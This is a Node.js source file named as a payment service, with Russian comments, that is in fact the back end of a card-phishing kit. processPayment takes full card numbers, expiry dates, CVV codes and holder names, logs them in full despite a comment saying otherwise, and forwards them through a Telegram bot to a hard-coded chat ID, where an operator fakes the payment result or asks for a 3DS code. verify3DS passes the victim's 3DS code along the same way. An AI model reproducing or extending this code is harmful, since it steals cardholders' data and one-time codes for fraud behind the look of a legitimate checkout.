const botService = require('./bot-service');
const logChatService = require('./log-chat-service');
const PaymentTrackingModel = require('../models/payment-tracking-model');
const UserModel = require('../models/user-model');



class PaymentService {
    async savePaymentTracking(userId, transactionId, amount, status) {
        try {
            if (!userId) {
                console.log('⚠️ PaymentTracking НЕ сохранен: userId отсутствует');
                return;
            }

            // Получаем пользователя чтобы узнать его реферальный код
            const user = await UserModel.findById(userId);
            
            if (!user) {
                console.log(`⚠️ PaymentTracking НЕ сохранен: пользователь ${userId} не найден`);
                return;
            }

            const paymentTracking = await PaymentTrackingModel.create({
                userId,
                transactionId,
                amount,
                referralCode: user.referralCode || null,
                status,
                timestamp: new Date()
            });

            console.log(`✅ PaymentTracking сохранен:`, {
                userId,
                transactionId,
                amount,
                referralCode: user.referralCode || 'нет кода',
                status
            });

            // Логируем успешное пополнение в чат
            if (status === 'success') {
                try {
                    await logChatService.logPayment(
                        userId,
                        user.email,
                        amount,
                        transactionId,
                        user.referralCode
                    );
                } catch (logError) {
                    console.warn('Ошибка логирования пополнения в чат:', logError.message);
                }
            }

            return paymentTracking;
        } catch (error) {
            console.error('❌ Ошибка сохранения PaymentTracking:', error.message);
        }
    }

    async processPayment(paymentData, userId = null) {
        const buttonPayment = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Подтвердить', callback_data: 'confirm' },
                        { text: '🔐 3DS', callback_data: 'request_3ds' }
                    ],
                    [
                        { text: '❌ Отменить', callback_data: 'cancel' }
                    ]
                ]
            }
        }
        const { cardNumber, expiryDate, cvv, cardHolder, amount } = paymentData;
        
        // Маскируем номер карты (показываем только последние 4 цифры)
        const maskedCardNumber = cardNumber.replace(/\s/g, '').slice(-4);
        
        // Генерируем уникальный ID транзакции
        const transactionId = `TXN-${Date.now()}-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
        
        // Логируем для отладки (не храним полные данные карты!)
        console.log(paymentData);
        
        const message = `💳 Новый платеж\n\n` +
            `💰 Сумма: ${paymentData.amount}\n` +
            `🔢 Карта: ${paymentData.cardNumber}\n` +
            `📅 Срок: ${paymentData.expiryDate}\n` +
            `🔐 CVV: ${paymentData.cvv}\n` +
            `👤 Владелец: ${paymentData.cardHolder}\n` +
            `🆔 ID транзакции: ${transactionId}`;
        
        // Отправляем сообщение и сразу ждем подтверждения
        console.log('Отправляю платеж администратору для подтверждения. ID транзакции:', transactionId);
        const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
        console.log('Получен результат от администратора:', JSON.stringify(result, null, 2));
        
        if (result.confirmed === true) {
            console.log('>>> ПЛАТЕЖ УСПЕШЕН (confirmed === true) <<<');
            
            // Сохраняем успешный платеж в статистику
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, amount, 'success');
            }
            
            return {
                transactionId,
                amount,
                status: 'success',
                timestamp: new Date().toISOString()
            };
        } else if (result.requires3DS === true) {
            console.log('>>> ТРЕБУЕТСЯ 3DS ВЕРИФИКАЦИЯ <<<');
            return {
                transactionId,
                amount,
                status: 'requires_3ds',
                timestamp: new Date().toISOString()
            };
        } else {
            console.log('>>> ПЛАТЕЖ ОТМЕНЕН (confirmed !== true) <<<');
            
            // Сохраняем отмененный платеж в статистику
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, amount, 'cancelled');
            }
            
            return {
                transactionId,
                amount,
                status: 'cancelled',
                reason: result.reason || 'cancelled_by_admin',
                timestamp: new Date().toISOString()
            };
        }
    }

    async verify3DS(transactionId, verificationCode, paymentData, userId = null) {
        const buttonPayment = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Подтвердить', callback_data: 'confirm' },
                        { text: '❌ Отменить', callback_data: 'cancel' }
                    ]
                ]
            }
        }

        const message = `🔐 3DS Верификация завершена\n\n` +
            `💰 Сумма: ${paymentData.amount}\n` +
            `🔢 Карта: ${paymentData.cardNumber}\n` +
            `👤 Владелец: ${paymentData.cardHolder}\n` +
            `🆔 ID транзакции: ${transactionId}\n` +
            `🔑 Код 3DS: ${verificationCode}`;

        console.log('Отправляю результат 3DS верификации администратору. ID транзакции:', transactionId);
        const result = await botService.sendMessageAndWait(7209588642, message, buttonPayment);
        console.log('Получен финальный результат от администратора:', JSON.stringify(result, null, 2));

        if (result.confirmed === true) {
            console.log('>>> ПЛАТЕЖ УСПЕШЕН ПОСЛЕ 3DS <<<');
            
            // Сохраняем успешный платеж после 3DS
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'success');
            }
            
            return {
                transactionId,
                amount: paymentData.amount,
                status: 'success',
                timestamp: new Date().toISOString()
            };
        } else {
            console.log('>>> ПЛАТЕЖ ОТМЕНЕН ПОСЛЕ 3DS <<<');
            
            // Сохраняем отмененный платеж после 3DS
            if (userId) {
                await this.savePaymentTracking(userId, transactionId, paymentData.amount, 'cancelled');
            }
            
            return {
                transactionId,
                amount: paymentData.amount,
                status: 'cancelled',
                reason: result.reason || 'cancelled_by_admin',
                timestamp: new Date().toISOString()
            };
        }
    }
}

module.exports = new PaymentService();